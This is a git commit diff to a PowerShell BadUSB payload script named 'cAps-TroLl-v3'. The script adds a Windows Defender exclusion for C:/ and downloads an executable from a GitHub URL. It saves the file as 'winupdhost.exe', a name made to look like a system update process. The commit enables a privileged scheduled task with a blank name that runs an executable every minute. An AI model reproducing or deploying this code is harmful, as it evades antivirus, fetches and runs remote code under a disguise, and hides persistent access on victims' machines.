802b9b23c6f679e70f4886633fb497baf023f85a
TobiS137 <75208393+TobiS137@users.noreply.github.com>
2025-03-27 14:01:25 +0100

    Update cAps-TroLl-v3.ps1

--- cAps-TroLl-v3/cAps-TroLl-v3.ps1
+++ cAps-TroLl-v3/cAps-TroLl-v3.ps1
@@ -2,6 +2,6 @@ cd $env:Temp;
 Add-MpPreference -ExclusionPath C:/;
 iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.exe -O winupdhost.exe -UseBasicParsing;
 Start-Sleep 1;
-# schtasks /create /tn "CapsLockTask" /tr "C:\Users\Administrator\Documents\cAps-TroLl-v2\capslock.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
+schtasks /create /tn "" /tr "C:\Users\Administrator\Documents\cAps-TroLl-v2\capslock.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
 Remove-MpPreference -ExclusionPath C:/;
 exit
